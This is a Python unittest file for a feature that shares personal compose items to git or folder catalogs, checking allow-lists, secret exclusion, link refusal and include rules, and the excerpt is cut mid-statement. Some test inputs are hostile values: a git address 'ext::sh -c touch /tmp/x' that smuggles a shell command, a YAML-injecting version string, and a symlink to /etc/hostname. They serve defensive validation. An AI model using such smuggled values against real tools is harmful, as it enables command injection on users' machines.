"""catalogs/contribute.py: Share to a catalog and the end of a share. The destinations a personal item can go to, the allow-list of
what is copied, the pre-flight (includes, secrets, private names, the text screen, Compose, the trust policy and the rules of
the standard), the commit built with plumbing, the branch that is pushed to a bare repository on this machine or the copy into a
folder, and "Use the catalog version". Everything is on disk in a temporary project folder (a visible skip without git): no
network, no Docker daemon. Two bases: `Real` reads the fixture catalogs with Compose 5 (a visible skip without it) and judges the
copy as the project does, for the tests whose point is the judgement; `Seam` puts a stand-in behind it, for the rest."""

import errno
import json
import os
import shutil
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

from lab_ui.library import check, layers, layout, moves, project
from lab_ui.docker import compose, envfiles, files
from lab_ui import paths
from lab_ui.catalogs import contribute, gitx, registry
from lab_ui.catalogs.registry import CatalogError

from .. import Case, fixtures, gitfixture

REAL_RULES = contribute._rules   # the rules of the standard, which `Seam` stands in for
REAL_YML = contribute._yml   # the reading of catalog.yml, which it stands in for too
REAL_OWN = contribute._own_rules   # the rules of an item of a catalog, asked of `check` with Compose: `Seam` stands in for them too
DAY = "20261016"
WHO = {"name": "Test Person", "email": "person@corp.example.test"}
SHOP = fixtures.CATALOGS / "fixture" / "playgrounds" / "shop"


def lines_of(error):
    """What a refusal says: (code, status, line)."""
    return error.code, error.status, error.message


class Base(Case):
    """A project folder with the fixture catalog as the default one and the partner catalog, both repositories (the Lab's store
    of each is there), a person with a name and an email, and git that reads local repositories. The personal items are Scratch
    (an add-on that includes Echo of the default catalog) and Bank (a playground of its own, a copy of the one the fixtures
    have)."""

    def setUp(self):
        gitfixture.require()
        self.environ(DOCKER_CONFIG=os.path.join(os.path.expanduser("~"), ".docker"))   # the Compose plugin is found there
        fixtures.project(self, paths, project, compose, envfiles, check, files, ns="fixture", kind="git", store=True)
        self.patch(paths, "_default", (None, None))
        self.home = gitfixture.isolate(self)
        self.person()
        self.patch(gitx, "_ending", False)
        self.patch(contribute, "_PROBES", {})
        self.patch(contribute, "_CATALOG_YML", {})
        self.patch(contribute, "_today", lambda: DAY)
        fixtures.install(self, "partner", kind="git", store=True)
        fixtures.local(self, "scratch")
        project.forget()
        self.addCleanup(project.forget)
        self.units = {"addons": {}, "setups": {}, "playgrounds": {}}
        self.item("addon", "scratch", "Scratch")
        self.units["addons"].update({"echo": {"name": "Echo", "personal": False, "settings": []},
                                     "@partner/ledger": {"name": "Ledger", "personal": False, "settings": []}})

    def environ(self, **values):
        patcher = mock.patch.dict(os.environ, values)
        patcher.start()
        self.addCleanup(patcher.stop)

    def person(self, name=WHO["name"], email=WHO["email"], more=""):
        """The Git configuration of the person, in the home folder the tests give git."""
        (self.home / ".gitconfig").write_text(f"[user]\n\tname = {name}\n\temail = {email}\n{more}", encoding="utf-8")

    def remote(self, ns):
        """The bare repository a catalog was installed from."""
        return fixtures.Remote(registry.entry(ns)["url"][len("file://"):])

    def item(self, kind, slug, name, text=None, **more):
        """A personal item the project knows: its file and its place in the project's units."""
        uid = f"local/{slug}"
        if text is not None:
            self.write(paths.unit_file(kind, uid), text)
        self.units[kind + "s"][uid] = {"name": name, "personal": True, "kind": kind, "services": [], "needs": [], "restarts": [],
                                       "members": [], "includes": [], "settings": [], **more}
        return uid

    def bank(self, ran=True, **extra):
        """The playground Bank: a copy of the fixtures' Shop, a seed, an app and a guide, with what a machine adds to it. It has
        started well here once (`ran`), as a playground is when it is shared."""
        if ran:
            self.write(".lab/tested.json", json.dumps({"local/bank": [{"versions": {}, "images": {}, "at": "2026-01-01T00:00:00Z"}]}))
        folder = self.root / ".lab/catalogs/local/playgrounds/bank"
        shutil.copytree(SHOP, folder)
        file = folder / "compose.yml"
        file.write_text(file.read_text(encoding="utf-8").replace("__SEEDER_IMAGE__", fixtures.seeder_image(self)), encoding="utf-8")
        for path, text in extra.items():
            self.write(f".lab/catalogs/local/playgrounds/bank/{path}", text)
        self.units["playgrounds"]["local/bank"] = {"name": "Shop", "personal": True}
        return "local/bank"

    def tree(self):
        """Every file of the project folder, to see that nothing else changed."""
        return sorted(file.relative_to(self.root).as_posix() for file in self.root.rglob("*")
                      if file.is_file() and file.name != "catalogs.flock")   # the lock a change takes is no change

    def mine(self):
        """The files of the personal catalog, to see that a share leaves them as they were."""
        return [path for path in self.tree() if path.startswith(".lab/catalogs/local/")]

    def stages(self):
        return [path.name for path in (self.root / ".lab/catalogs").iterdir() if path.name.startswith(".stage-share")]


class Seam(Base):
    """The judgement of the trust policy and the reading of catalog.yml are stand-ins, so that a test is about the share: what
    is copied, what is refused, what the repository gets."""

    def setUp(self):
        super().setUp()
        self.against = []   # the reasons the stand-in policy gives
        self.yml = {}   # {ns: what the Lab reads in its catalog.yml}
        self.judged = self.patch(contribute, "_judged", mock.Mock(side_effect=lambda *args: list(self.against)))
        self.patch(contribute, "_yml", lambda ns: self.yml.get(ns, {}))
        self.patch(contribute, "_rules", lambda *args: [])
        self.own = []   # the lines the rules of an item give the personal file: `check` reads the project with Compose
        self.patch(contribute, "_own_rules", lambda file: list(self.own))

    def share(self, uid="local/scratch", to="fixture", kind="addon", check_only=False):
        return contribute.share(self.units, kind, uid, to, check_only)


class Vouched(Seam):
    """A playground is shared once it has started well here, its seed ended without an error included: what it started on is its
    `tested` in the catalog."""

    def test_a_playground_that_never_ran_is_told_to_start_and_nothing_goes(self):
        self.bank(ran=False)
        problems = self.share("local/bank", "fixture", "playground", True)["problems"]
        self.assertEqual([line for line in problems if line.startswith("It has not run yet")], [
            "It has not run yet. Fix: start it here and let its seed end without an error."])
        with self.assertRaises(ValueError) as raised:
            self.share("local/bank", "fixture", "playground")
        self.assertIn("It has not run yet", str(raised.exception))

    def test_a_playground_that_ran_is_not_told_so(self):
        self.bank()
        problems = self.share("local/bank", "fixture", "playground", True)["problems"]
        self.assertEqual([line for line in problems if "has not run" in line], [])

    def test_what_it_ran_on_is_declared_in_the_copy_when_the_file_declares_nothing(self):
        text = "x-gravitee:\n  category: Demo\nservices: {}\n"
        copy = contribute.Copy({"playgrounds/bank/compose.yml": ("100644", text.encode())}, text, text, [])
        self.write(".lab/tested.json", json.dumps({"local/bank": [{"versions": {"APIM_VERSION": "4.12.0"}, "images": {}, "at": "x"}]}))
        declared = contribute._vouched({"playgrounds": {"local/bank": {"tested": []}}}, "local/bank", copy)
        self.assertEqual(declared.problems, [])
        self.assertEqual(declared.text, 'x-gravitee:\n  tested:\n    - APIM_VERSION: "4.12.0"\n  category: Demo\nservices: {}\n')
        self.assertEqual(declared.files["playgrounds/bank/compose.yml"][1].decode(), declared.text)
        self.assertEqual(declared.kept, text)

    def test_the_versions_of_a_run_are_one_set_not_one_set_each(self):
        text = "x-gravitee:\n  category: Demo\n"
        written = contribute._declared(text, {"APIM_VERSION": "4.12.0", "AM_VERSION": "4.12.7"})
        self.assertEqual(written, 'x-gravitee:\n  tested:\n    - APIM_VERSION: "4.12.0"\n      AM_VERSION: "4.12.7"\n  category: Demo\n')
        try:
            import yaml
        except ImportError:
            return
        self.assertEqual(yaml.safe_load(written)["x-gravitee"]["tested"], [{"APIM_VERSION": "4.12.0", "AM_VERSION": "4.12.7"}])
        self.assertIsNone(contribute._declared(text, {}))

    def test_a_set_the_file_declares_is_kept_as_it_is(self):
        text = "x-gravitee:\n  tested:\n    - APIM_VERSION: \"4.11.0\"\nservices: {}\n"
        copy = contribute.Copy({"playgrounds/bank/compose.yml": ("100644", text.encode())}, text, text, [])
        self.write(".lab/tested.json", json.dumps({"local/bank": [{"versions": {"APIM_VERSION": "4.12.0"}, "images": {}, "at": "x"}]}))
        self.assertEqual(contribute._vouched({"playgrounds": {"local/bank": {"tested": [{"APIM_VERSION": "4.11.0"}]}}}, "local/bank", copy), copy)

    def test_a_file_with_no_x_gravitee_block_is_told_to_declare_it(self):
        text = "services: {}\n"
        copy = contribute.Copy({"playgrounds/bank/compose.yml": ("100644", text.encode())}, text, text, [])
        self.write(".lab/tested.json", json.dumps({"local/bank": [{"versions": {"APIM_VERSION": "4.12.0"}, "images": {}, "at": "x"}]}))
        found = contribute._vouched({"playgrounds": {"local/bank": {"tested": []}}}, "local/bank", copy)
        self.assertEqual(found.text, text)
        self.assertEqual(found.problems, ["Its file has no x-gravitee block to say the versions it ran on. Fix: add x-gravitee.tested with the versions it started on."])

    def test_a_value_that_is_no_version_is_not_written(self):
        self.assertIsNone(contribute._declared("x-gravitee:\n  a: 1\n", {"APIM_VERSION": '4"\ninjected: 1'}))
        self.assertIsNone(contribute._declared("x-gravitee:\n  a: 1\n", {"apim version": "4.12.0"}))


class Alone(Case):
    """No catalog is added: there is nowhere to share to, and the dialog offers New catalog and Add catalog."""

    def test_there_is_no_destination(self):
        self.folder(paths, project)
        self.write(paths.unit_file("addon", "local/x"), "services: {}\n")
        self.assertEqual(contribute.destinations({"addons": {}}, "addon", "local/x"), [])
        with self.assertRaises(paths.NotFound):
            contribute.share({"addons": {}}, "addon", "local/x", "fixture", True)


class Destinations(Seam):

    def test_each_catalog_that_takes_contributions_is_one_the_default_catalog_first(self):
        found = contribute.destinations(self.units, "addon", "local/scratch")
        self.assertEqual([one["id"] for one in found], ["fixture", "partner"])
        self.assertEqual(found[0], {"id": "fixture", "name": "Fixture catalog", "kind": "git", "writable": True,
                                    "audience": "public", "reason": ""})
        self.assertEqual((found[1]["audience"], found[1]["kind"]), ("private", "git"))

    def test_what_the_item_includes_decides_which_catalog_can_take_it(self):
        # Scratch includes Echo, which is in the default catalog: the partner does not declare it
        found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertEqual(found["partner"]["reason"], "Includes Echo (Fixture catalog), which Partner fixture does not declare.")
        self.assertTrue(found["partner"]["writable"], "it could be pushed to: the item is the problem")
        self.assertEqual(found["fixture"]["reason"], "")
        # The default catalog declares the partner's: an item that includes its Ledger goes to the default catalog
        self.item("addon", "ledgered", "Ledgered", "include:\n  - ../../../partner/addons/ledger/compose.yml\nservices: {}\n")
        found = {one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/ledgered")}
        self.assertEqual(found, {"fixture": "", "partner": ""})

    def test_an_item_that_includes_another_item_of_this_machine_goes_nowhere(self):
        self.item("addon", "tied", "Tied", "include:\n  - ../scratch/compose.yml\nservices: {}\n")
        found = {one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/tied")}
        self.assertEqual(found, {"fixture": "Includes Scratch, which is not in Fixture catalog.",
                                 "partner": "Includes Scratch, which is not in Partner fixture."})

    def test_what_catalog_yml_says_is_read_again_only_when_the_file_changes(self):
        self.patch(contribute, "_yml", REAL_YML)
        read = self.patch(contribute.manifest, "read_catalog", return_value={"contribute": "none"})
        for _ in range(3):
            self.assertEqual({one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/scratch")}["partner"],
                             "Partner fixture does not take contributions from the Lab.")
        self.assertEqual(read.call_count, 2, "once for each repository")
        file = self.root / ".lab/catalogs/partner/catalog.yml"
        file.chmod(0o644)
        file.write_text(file.read_text() + "# a new line\n")
        read.return_value = {"contribute": "pull-request"}
        found = {one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertNotIn("contributions", found["partner"])
        self.assertEqual(read.call_count, 3)

    def test_a_catalog_yml_that_cannot_be_read_is_no_refusal(self):
        self.patch(contribute, "_yml", REAL_YML)
        self.patch(contribute.manifest, "read_catalog", side_effect=CatalogError("catalog_invalid", "catalog.yml: bad.", 400))
        self.assertEqual({one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/scratch")}["partner"],
                         "Includes Echo (Fixture catalog), which Partner fixture does not declare.")

    def test_a_catalog_that_says_it_takes_no_contributions_is_there_with_its_reason(self):
        self.yml["partner"] = {"contribute": "none"}
        found = {one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertEqual(found["partner"], "Partner fixture does not take contributions from the Lab.")

    def test_a_push_that_was_refused_lately_is_remembered_and_the_network_is_not_asked(self):
        probe = self.patch(gitx, "push_probe", return_value="no")
        with self.assertRaises(CatalogError):
            self.share(check_only=True)
        found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/scratch")}
        self.assertEqual((found["fixture"]["writable"], found["fixture"]["reason"]),
                         (False, "You cannot push to Fixture catalog. Ask for access."))
        self.assertEqual(probe.call_count, 1, "the listing asked nothing")

    def test_the_sweep_has_nothing_to_do_when_no_catalog_is_a_folder(self):
        self.write(".lab/catalogs/fixture/addons/.share-old/compose.yml", "theirs")
        os.utime(self.root / ".lab/catalogs/fixture/addons/.share-old", (1, 1))
        self.assertEqual(contribute.sweep(), [])
        self.assertTrue((self.root / ".lab/catalogs/fixture/addons/.share-old").is_dir())

    def test_a_catalog_with_no_copy_and_the_personal_area_are_not_destinations(self):
        fixtures.declare(self, "lab-new")   # added, not downloaded
        self.assertEqual([one["id"] for one in contribute.destinations(self.units, "addon", "local/scratch")],
                         ["fixture", "partner"])

    def test_a_folder_is_one_unless_it_cannot_be_written(self):
        fixtures.install(self, "lab-new", "folder")
        self.item("addon", "plain", "Plain", "services: {}\n")
        found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/plain")}
        self.assertEqual((found["lab-new"]["kind"], found["lab-new"]["writable"]), ("folder", True))
        with mock.patch("os.access", return_value=False):
            found = {one["id"]: one for one in contribute.destinations(self.units, "addon", "local/plain")}
        self.assertFalse(found["lab-new"]["writable"])
        self.assertTrue(found["lab-new"]["reason"].endswith("cannot be written to."))

    def test_only_an_item_of_this_machine_has_destinations(self):
        for uid in ("echo", "local/../echo", "@partner/ledger"):
            with self.subTest(uid=uid), self.assertRaisesRegex(ValueError, "Only your own add-ons can be shared here"):
                contribute.destinations(self.units, "addon", uid)
        with self.assertRaises(paths.NotFound):
            contribute.destinations(self.units, "addon", "local/gone")
        with self.assertRaisesRegex(ValueError, "not a kind"):
            contribute.destinations(self.units, "thing", "local/scratch")


RICH = """x-gravitee: {kind: addon, name: Rich, category: Other, description: Has everything}
services:
  rich:
    image: busybox:${RICH_VERSION:-1.36}
    build: ./apps/rich
    volumes:
      - ./config/app.conf:/etc/app.conf:ro
      - ./.state:/state
      - ./data:/data
      - ./.env:/env
      - rich-data:/var/lib
      - ../scratch/compose.yml:/elsewhere
volumes:
  rich-data: {}
"""


class Address(Case):
    """The address a repository is pushed to."""

    ENTRY = {"id": "acme-hub", "kind": "git", "url": "https://github.com/acme/lab-hub.git", "branch": "dev"}

    def test_the_form_that_answered_the_last_time_is_the_one_used(self):
        address, branch = contribute._address(self.ENTRY, {})
        self.assertEqual((address.url, branch), ("https://github.com/acme/lab-hub.git", "dev"))
        address, branch = contribute._address(self.ENTRY, {"via": "ssh"})
        self.assertEqual((address.url, branch), ("git@github.com:acme/lab-hub.git", "dev"))
        self.assertEqual(contribute._address(self.ENTRY, {"via": "https"})[0].url, "https://github.com/acme/lab-hub.git")

    def test_an_address_the_grammar_refuses_is_the_catalogs_refusal(self):
        with self.assertRaises(CatalogError) as raised:
            contribute._address({**self.ENTRY, "url": "ext::sh -c touch /tmp/x"}, {})
        self.assertEqual(raised.exception.code, "bad_address")
        with self.assertRaises(CatalogError):
            contribute._address({"id": "x", "kind": "git"}, {})


class Collect(Seam):
    """What is copied of an item's folder: the allow-list, less what the Lab never installs and the scratch of an editor."""

    def rich(self):
        folder = ".lab/catalogs/local/addons/rich"
        for path, text in {
                "compose.yml": RICH, "README.md": "# Rich\n", "guide.md": "# Rich\n", ".env.example": "RICH_TOKEN=\n",
                "seed/apim/apis/a.json": "{}", "seed/secrets/token": "x", "apps/rich/Dockerfile": "FROM scratch\n",
                "apps/rich/src/main.py": "print(1)\n", "apps/rich/run.sh": "#!/bin/sh\n", "apps/rich/.env": "A=1\n",
                "apps/rich/node_modules/x/index.js": "x", "apps/rich/__pycache__/m.pyc": "x", "apps/rich/notes.txt~": "x",
                "config/app.conf": "a=1\n", "config/other.conf": "b=2\n", "data/seed.sql": "select 1;\n",
                ".env": "TOKEN=real\n", ".state/created.json": "{}", "secrets/key": "k", "server.key": "k", "notes.txt": "mine",
                ".DS_Store": "x", "README.md.bak": "x", ".compose.yml.check.yml": "x", "compose.yml~": "x",
                ".github/workflows/x.yml": "on: push\n", "apps/rich/bad name.txt": "x"}.items():
            self.write(f"{folder}/{path}", text)
        (self.root / folder / "apps/rich/run.sh").chmod(0o755)
        os.symlink("/etc/hostname", self.root / folder / "apps/rich/link")
        self.units["addons"]["local/rich"] = {"name": "Rich", "personal": True}

    def test_the_allow_list_and_nothing_else(self):
        self.rich()
        copy = contribute.collect("addon", "rich", "partner")
        self.assertEqual(sorted(copy.files), [
            "addons/rich/.env.example", "addons/rich/README.md", "addons/rich/apps/rich/Dockerfile", "addons/rich/apps/rich/run.sh",
            "addons/rich/apps/rich/src/main.py", "addons/rich/compose.yml", "addons/rich/config/app.conf",
            "addons/rich/data/seed.sql", "addons/rich/guide.md", "addons/rich/seed/apim/apis/a.json"])
        self.assertEqual(copy.files["addons/rich/apps/rich/run.sh"][0], "100755")
        self.assertEqual(copy.files["addons/rich/config/app.conf"], ("100644", b"a=1\n"))

    def test_what_is_left_out_and_would_be_missed_is_told_and_what_is_machine_state_is_not(self):
        self.rich()
        copy = contribute.collect("addon", "rich", "partner")
        self.assertEqual(copy.problems, [
            "apps/rich/link is a link. Fix: copy the file itself; a catalog installs no link.",
            ".env is named by compose.yml and is not shared. Fix: make it a setting, or create it when the item starts.",
            "apps/rich/bad name.txt has a name the Lab cannot install. Fix: use letters, digits and . _ + - only."])

    def test_the_machines_files_never_leave_whatever_the_compose_file_says(self):
        self.rich()
        names = [path.split("addons/rich/", 1)[1] for path in contribute.collect("addon", "rich", "partner").files]
        for path in names:
            parts = path.split("/")
            self.assertFalse({".state", "secrets", ".github", "node_modules", "__pycache__", ".DS_Store", "notes.txt"} & set(parts), path)
            self.assertFalse(parts[-1].endswith((".key", ".bak", "~", ".pyc")) or parts[-1].startswith(".env") and parts[-1] != ".env.example", path)
            self.assertNotRegex(parts[-1], r"^\..*\.(check|effects)\.yml$")

    def test_a_link_on_the_way_to_a_file_the_compose_file_names_is_not_followed(self):
        outside = self.root.parent / "outside-the-item"
        outside.mkdir(exist_ok=True)
        self.addCleanup(shutil.rmtree, outside, True)
        (outside / "hostname").write_text("secret host")
        self.item("addon", "linked", "Linked", "services:\n  a:\n    image: x\n    volumes:\n      - ./config/hostname:/etc/hostname\n")
        os.symlink(outside, self.root / ".lab/catalogs/local/addons/linked/config")
        copy = contribute.collect("addon", "linked", "fixture")
        self.assertEqual(sorted(copy.files), ["addons/linked/compose.yml"])
        self.assertEqual(copy.problems, ["config is a link. Fix: copy the folder itself; a catalog installs no link."])

    def test_a_seed_folder_the_machine_wrote_is_not_walked(self):
        self.rich()
        for number in range(contribute.LOOK + 5):
            self.write(f".lab/catalogs/local/addons/rich/.state/{number}.json")
        copy = contribute.collect("addon", "rich", "partner")
        self.assertNotIn("It holds more files than a catalog item may. Fix: split it.", copy.problems)

    def test_an_item_of_more_files_than_an_item_may_hold_is_told(self):
        self.rich()
        for number in range(contribute.LOOK + 5):
            self.write(f".lab/catalogs/local/addons/rich/apps/rich/gen/{number}.txt")
        self.assertIn("It holds more files than a catalog item may. Fix: split it.",
                      contribute.collect("addon", "rich", "partner").problems)

    def test_a_file_the_standard_refuses_for_its_size_is_told_and_left_out(self):
        self.rich()
        (self.root / ".lab/catalogs/local/addons/rich/apps/rich/big.bin").write_bytes(b"\0" * (2 * 1024 * 1024 + 1))
        copy = contribute.collect("addon", "rich", "partner")
        self.assertNotIn("addons/rich/apps/rich/big.bin", copy.files)
        self.assertIn("apps/rich/big.bin is larger than a catalog keeps. Fix: shrink it, or leave it out.", copy.problems)

    def test_the_compose_file_is_written_again_for_where_it_will_be(self):
        # Scratch includes Echo of the default catalog: in the default catalog it is a neighbour, in the partner's a stranger
        there = contribute.collect("addon", "scratch", "fixture")
        self.assertIn("  - ../echo/compose.yml\n", there.text)
        self.assertEqual(there.files["addons/scratch/compose.yml"], ("100644", there.text.encode()))
        elsewhere = contribute.collect("addon", "scratch", "partner")
        self.assertIn("  - ../../../fixture/addons/echo/compose.yml\n", elsewhere.text)
        self.assertEqual(elsewhere.text, elsewhere.kept)
        # Only the paths that leave the folder change: a command that holds ".." is the container's
        self.assertEqual(there.text.replace("../echo", "../../../fixture/addons/echo"), there.kept)

    def test_a_setup_is_one_file_and_its_includes_follow_the_same_rule(self):
        self.item("setup", "pair", "Pair", "include:\n  - ../../fixture/addons/echo/compose.yml\n")
        there = contribute.collect("setup", "pair", "fixture")
        self.assertEqual(sorted(there.files), ["setups/pair.yml"])
        self.assertEqual(there.text, "include:\n  - ../addons/echo/compose.yml\n")
        self.assertEqual(contribute.collect("setup", "pair", "partner").text, "include:\n  - ../../fixture/addons/echo/compose.yml\n")

    def test_the_seeder_the_seed_and_the_state_keep_their_paths(self):
        self.bank()
        for ns in ("fixture", "partner"):
            copy = contribute.collect("playground", "bank", ns)
            self.assertEqual(copy.text, copy.kept, ns)
            self.assertIn("build: ../../../../../seeder", copy.text)
            self.assertIn("./seed:/seed:ro", copy.text)
        self.assertEqual(sorted(contribute.collect("playground", "bank", "partner").files), [
            "playgrounds/bank/README.md", "playgrounds/bank/apps/web/Dockerfile", "playgrounds/bank/apps/web/index.html",
            "playgrounds/bank/compose.yml", "playgrounds/bank/guide.md", "playgrounds/bank/seed/am/domain.yaml",
            "playgrounds/bank/seed/apim/apis/shop.json"])

    def test_a_compose_file_over_the_size_a_catalog_keeps_is_not_read_whole(self):
        self.item("addon", "huge", "Huge")
        (self.root / paths.unit_file("addon", "local/huge")).parent.mkdir(parents=True)
        (self.root / paths.unit_file("addon", "local/huge")).write_text("services: {}\n" + "# padding\n" * 200000)
        copy = contribute.collect("addon", "huge", "fixture")
        self.assertEqual(copy.problems, ["compose.yml is larger than a catalog keeps. Fix: shrink it, or leave it out."])
        self.assertEqual(copy.kept, "")

    def test_a_compose_file_that_is_not_text_is_told(self):
        self.item("addon", "binary", "Binary")
        (self.root / paths.unit_file("addon", "local/binary")).parent.mkdir(parents=True)
        (self.root / paths.unit_file("addon", "local/binary")).write_bytes(b"\xff\xfe not utf8")
        self.assertEqual(contribute.collect("addon", "binary", "fixture").problems, ["compose.yml is not UTF-8 text."])

    def test_the_paths_a_compose_file_names_inside_its_folder(self):
        named = contribute._named
        self.assertEqual(named("volumes:\n  - ./seed:/seed:ro\n  - ./.state:/state\n  - data:/var\n  - /abs:/x\n"
                               "  - ../up:/y\n  - ${HOME}/x:/z\n  - ./a/../../out:/w\n"), [".state", "seed"])
        self.assertEqual(named("services:\n  a:\n    build:\n      context: apps/web\n      dockerfile: Dockerfile\n"
                               "    configs:\n      - source: conf\n  b:\n    build: ./apps/b\n    command: sh -c 'cd ./x'\n"
                               "    environment:\n      CONFIG: ./not-a-path\n"), ["apps/b", "apps/web", "conf"])
        self.assertEqual(named("services:\n  a:\n    build: .\n"), [""], "the folder itself")
        self.assertEqual(named("configs:\n  c:\n    file: ./etc/c.conf\n  d:\n    file: https://x/y\n"), ["etc/c.conf"])
        self.assertEqual(named("services: {}\n"), [])


class Judged(Seam):
    """The check of a share and what it answers: what is refused with a line of the catalogue of errors, and what is a problem to fix first."""

    def test_a_check_answers_with_the_destinations_the_problems_what_changes_and_who_commits(self):
        answer = self.share(check_only=True)
        self.assertEqual(sorted(answer), ["audience", "carries", "changes", "destinations", "identity", "problems", "renames", "reuses", "to"])
        self.assertEqual((answer["carries"], answer["reuses"], answer["renames"]), ([], [], []), "nothing of this machine, no setting of its own")
        self.assertEqual((answer["to"], answer["audience"], answer["problems"], answer["changes"], answer["identity"]),
                         ("fixture", "public", [], ["compose.yml"], WHO["email"]))
        self.assertEqual([one["id"] for one in answer["destinations"]], ["fixture", "partner"])

    def test_who_commits_is_said_only_where_everyone_can_read_it(self):
        self.item("addon", "plain", "Plain", "services: {}\n")
        answer = self.share("local/plain", "partner", check_only=True)
        self.assertEqual((answer["audience"], answer["identity"]), ("private", None))

    def test_a_check_writes_nothing_anywhere(self):
        before, remote, store = self.tree(), self.remote("fixture"), self.root / ".lab/cache/git/fixture.git"
        heads, held = remote.git("for-each-ref"), fixtures.Remote(store).git("for-each-ref")
        self.share(check_only=True)
        self.assertEqual(self.tree(), before)
        self.assertEqual(self.stages(), [])
        self.assertEqual((remote.git("for-each-ref"), fixtures.Remote(store).git("for-each-ref")), (heads, held))

    def test_the_copy_is_judged_where_a_unit_sits_with_its_includes_reaching_the_same_files(self):
        seen = {}

        def judge(project_, kind, uid, slug, ns, row, copy, stage, folder, *_):
            seen["stage"] = stage
            seen["text"] = (self.root / stage).read_text()
            seen["files"] = sorted(path.name for path in Path(folder).iterdir())
            seen["depth"] = len(Path(stage).parts)
            seen["same"] = (self.root / ".lab/catalogs/fixture/addons/echo/compose.yml").samefile(
                Path(folder) / "../../../fixture/addons/echo/compose.yml")
            return []
        self.patch(contribute, "_judged", judge)
        self.share(check_only=True)
        self.assertRegex(seen["stage"], r"^\.lab/catalogs/\.stage-share~[0-9a-f]{8}/addons/scratch/compose\.yml$")
        self.assertEqual(seen["depth"], len(Path(paths.unit_file("addon", "scratch")).parts), "at the depth of a unit")
        # In the stage the neighbour of the default catalog is a stranger that leads to the same file
        self.assertIn("  - ../../../fixture/addons/echo/compose.yml\n", seen["text"])
        self.assertTrue(seen["same"])
        self.assertEqual(seen["files"], ["README.md", "compose.yml"])
        self.assertEqual(self.stages(), [], "and gone when the check is")

    def test_the_copy_is_gone_when_the_judgement_fails_too(self):
        self.patch(contribute, "_judged", mock.Mock(side_effect=compose.ComposeError("boom")))
        answer = self.share(check_only=True)
        self.assertEqual(answer["problems"], ["Does not load with the platform: boom"])
        self.patch(contribute, "_judged", mock.Mock(side_effect=RuntimeError("fault")))
        with self.assertRaisesRegex(RuntimeError, "fault"):
            self.share(check_only=True)
        self.assertEqual(self.stages(), [])

    def test_what_the_policy_gives_a_reason_for_is_a_problem_with_the_words_a_consumer_meets(self):
        self.against = ["Mounts the Docker socket", "Publishes a port to the network"]
        answer = self.share(check_only=True)
        self.assertEqual(answer["problems"], ["Blocked: Mounts the Docker socket", "Blocked: Publishes a port to the network"])
        with self.assertRaisesRegex(ValueError, "^Blocked: Mounts the Docker socket$"):
            self.share()

    def test_the_text_screen_is_asked_first_and_what_it_refuses_never_reaches_compose(self):
        self.item("addon", "reads", "Reads", "services:\n  a:\n    image: x\n    env_file: .env\n")
        answer = self.share("local/reads", check_only=True)
        self.assertEqual(len(answer["problems"]), 1)
        self.assertTrue(answer["problems"][0].startswith("Blocked: "), answer["problems"])
        self.judged.assert_not_called()

    def test_compose_failing_is_a_problem_in_words_that_do_not_name_the_copy(self):
        def judge(project_, kind, uid, slug, ns, row, copy, stage, folder, *_):
            top = stage.split("/addons/")[0]
            raise compose.ComposeError(f"validating {self.root / top}/addons/scratch/compose.yml: services.a must be a mapping\n"
                                       f"{top}/addons/scratch/compose.yml: bad")
        self.patch(contribute, "_judged", judge)
        problems = self.share(check_only=True)["problems"]
        self.assertEqual(len(problems), 1)
        self.assertEqual(problems[0], "Does not load with the platform: validating compose.yml: services.a must be a mapping\ncompose.yml: bad")

    def test_an_include_of_another_item_of_this_machine_is_refused_with_the_line_of_section_11(self):
        self.item("addon", "tied", "Tied", "include:\n  - ../scratch/compose.yml\nservices: {}\n")
        for to in ("fixture", "partner"):
            with self.subTest(to=to), self.assertRaises(CatalogError) as raised:
                self.share("local/tied", to, check_only=True)
            self.assertEqual(raised.exception.code, "share_includes")
            self.assertEqual(lines_of(raised.exception)[1:], (400, "Includes Scratch, which is not in "
                                                              + ("Fixture catalog." if to == "fixture" else "Partner fixture.")))

    def test_an_include_that_the_target_has_already_is_told_to_be_replaced_by_the_catalog_version(self):
        self.item("addon", "tied", "Tied", "include:\n  - ../scratch/compose.yml\nservices: {}\n")
        real = registry.units_of
        self.patch(registry, "units_of", lambda ns: {**real(ns), "addon": [*(real(ns).get("addon") or ()), "scratch"]} if ns == "fixture" else real(ns))
        with self.assertRaises(CatalogError) as raised:
            self.share("local/tied", "fixture", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_use_catalog", 400, "Includes Scratch, which Fixture catalog has already: "
                                                      "use the catalog version of it, then share this."))
        found = {one["id"]: one["reason"] for one in contribute.destinations(self.units, "addon", "local/tied")}
        self.assertEqual(found["partner"], "Includes Scratch, which is not in Partner fixture.", "the other catalog does not have it")

    def test_an_include_of_a_catalog_the_target_does_not_declare_is_refused_and_one_it_declares_is_not(self):
        with self.assertRaises(CatalogError) as raised:
            self.share("local/scratch", "partner", check_only=True)
        self.assertEqual(lines_of(raised.exception), ("share_includes", 400, "Includes Echo, which is not in Partner fixture."))
        self.item("addon", "ledgered", "Ledgered", "include:\n  - ../../../partner/addons/ledger/compose.yml\nservices: {}\n")
        self.assertEqual(self.share("local/ledgered", "fixture", check_only=True)["problems"], [])
        self.assertEqual(self.share("local/ledgered", "partner", check_only=True)["problems"], [])

    def test_an_include_the_screen_cannot_follow_or_that_is_no_item_is_a_problem(self):
        self.item("addon", "odd", "Odd", "include:\n  - path: ../../../fixture/addons/echo/compose.yml\n    required: false\nservices: {}\n")
        problems = self.share("local/odd", check_only=True)["problems"]
        self.assertEqual(problems, ["It includes in a form the check cannot follow. Fix: write each include as a list item, "
                                    "- ../../addons/<name>/compose.yml."])
        self.item("addon", "plain-file", "Plain file", "include:\n  - ../../../../seeder/Dockerfile\nservices: {}\n")
        problems = self.share("local/plain-file", check_only=True)["problems"]
        self.assertIn("Includes Dockerfile, which is not an item of a catalog.", problems)
        self.assertIn("Plain file: its compose file cannot be read (.lab/seeder/Dockerfile is not there). Fix: "
